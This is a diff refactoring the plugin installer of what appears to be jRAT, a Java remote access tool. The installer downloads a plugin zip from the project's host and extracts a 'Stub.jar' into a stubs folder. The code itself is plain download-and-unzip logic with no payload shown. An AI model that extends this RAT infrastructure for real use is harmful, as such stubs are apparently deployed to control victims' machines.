@@ -12,8 +12,7 @@ import java.util.zip.ZipEntry;
 import java.util.zip.ZipFile;
 
 import pro.jrat.Constants;
-import pro.jrat.ErrorDialog;
-import pro.jrat.UniqueKey;
+import pro.jrat.UniqueId;
 import pro.jrat.common.listeners.CopyStreamsListener;
 import pro.jrat.common.utils.IOUtils;
 import pro.jrat.common.utils.MathUtils;
@@ -30,16 +29,11 @@ public class ExtensionInstaller {
 		this.listener = listener;
 	}
 
-	public void toggle() {
-		try {
-			if (plugin.isInstalled()) {
-				install(); // TODO
-			} else {
-				install();
-			}
-		} catch (Exception e) {
-			e.printStackTrace();
-			ErrorDialog.create(e);
+	public void toggle() throws Exception {
+		if (plugin.isInstalled()) {
+			install(); // TODO
+		} else {
+			install();
 		}
 	}
 
@@ -51,16 +45,16 @@ public class ExtensionInstaller {
 
 	public void install() throws Exception {
 		listener.status(Color.black, "Connecting...", 0);
-		
+
 		File temp = File.createTempFile(plugin.getName() + "_temp_download", ".zip");
 
-		URLConnection archiveConnection = WebRequest.getConnection(Constants.HOST + "/plugins/getplugin.php?plugin=" + plugin.getName() + "&key=" + UniqueKey.getKey());
+		URLConnection archiveConnection = WebRequest.getConnection(Constants.HOST + "/plugins/getplugin.php?plugin=" + plugin.getName() + "&key=" + UniqueId.getTextual());
 		archiveConnection.connect();
-		
+
 		long length = archiveConnection.getContentLengthLong();
-		
+
 		InputStream archive = archiveConnection.getInputStream();
-		
+
 		FileOutputStream out = new FileOutputStream(temp);
 
 		IOUtils.copy(length, archive, out, new CopyStreamsListener() {
@@ -76,15 +70,15 @@ public class ExtensionInstaller {
 		ZipFile zip = new ZipFile(temp);
 		Enumeration<? extends ZipEntry> entriesEnum = zip.entries();
 		List<ZipEntry> entries = new ArrayList<ZipEntry>();
-		
+
 		while (entriesEnum.hasMoreElements()) {
 			entries.add(entriesEnum.nextElement());
 		}
 
 		for (int i = 0; i < entries.size(); i++) {
 			ZipEntry entry = entries.get(i);
-			
-			File output;	
+
+			File output;
 
 			if (entry.getName().equals("Stub.jar")) {
 				output = new File("plugins/stubs/" + plugin.getName() + ".jar");
@@ -99,7 +93,7 @@ public class ExtensionInstaller {
 			}
 
 			output.createNewFile();
-			
+
 			listener.status(Color.black, "Writing " + output.getName(), MathUtils.getPercentFromTotal(i, entries.size()));
 
 			InputStream entryIs = zip.getInputStream(entry);
@@ -114,7 +108,7 @@ public class ExtensionInstaller {
 		zip.close();
 
 		temp.delete();
-		
+
 		new Plugin(plugin.getJar());
 	}
 
